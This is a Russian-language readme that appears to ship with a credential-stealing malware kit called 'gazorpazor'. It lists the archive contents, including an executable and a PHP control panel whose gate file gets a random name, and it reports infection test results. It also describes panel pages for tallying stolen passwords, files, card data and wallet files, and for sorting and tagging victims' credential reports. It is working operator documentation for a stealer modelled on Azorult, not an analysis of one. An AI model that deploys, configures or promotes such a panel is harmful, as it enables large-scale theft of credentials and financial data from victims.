readme.txt
=================
- php 5.6
- mysql
- apache/nginx
=================
Состав архива:

gazorpazor.zip 
 - gazorpazor.exe
 - readme.txt (вы сейчас читаете этот файл)
 - panel/
  ├── app/
  ├── css/
  ├── fonts/
  ├── img/
  ├── js/
  ├── oldshit/
  ├── reports/
  ├── ????.php - гейт, всегда разное имя (a-z0-9, 5 символов)
  ├── config.php
  ├── cron.php
  ├── index.php
  ├── install.php
  └── robots.txt

После того как распаковали, панель готова к установке. 
=================

+++++++++++++++++ Важно: после установки install.php + gazorpazor.zip удаляется +++++++++++++++++

=================

Основная информация:

Тест оригинального билда, gazorpazor.exe(не криптованный) на 30 загрузках: 30 запустилось, 22 отстучало.
=================
/stat

Показывает текущую статистику по загрузкам, флаги(название стран) кликабельны. 
 Total reports: 22
 24 hours: 22
 7 days: 22
 Month: 22

 Admin: 4
 User: 18

 x32: 3
 x64: 19

 Files: 22
 Passwords: 17
 CC: 0
 Wallet.dat: 0
 Empty: 0
 No report: 4 - конфиг взят, репорта еще нет.
 Comment: 0
 Suspicious: 0

 Win 7 : 13
 Win 10 : 9

=================
/reports

- Filter hide/show - набор различных фильтров
 После того как задали фильтры, нажать кнопку Filter.
- Работа с репортами стала удобна, как никогда: 
 реализовано удобное комментирование репортов 
 пин важных репортов в начало списка
 отметка цветом интересных репортов

=================
/links

- Add link hide/show - набор критичных линков 
 (если в репорте есть нужный линк, на вкладке password будет висеть ярлык с названием линка)

=================
/config

- Stealer config 
 стандартно как у Azorult
- DB functions
 Генератор ботов, для демонстрации.
 Change all 'Cannot Decrypt' passwords as 'not valid - маркерует невалидные пароли.
 Empty login/pass as 'not valid' - удаление пустышек
 Update password groups - проход по всем аккаунтам из таблицы passwords и подстановка плашек из разных групп линков
 (TODO) One 404 - All 404
 (TODO) Domain undelegated - as 404
 (TODO) Delete duplicate log/pass/url
 (TODO) Clean DB - удалить все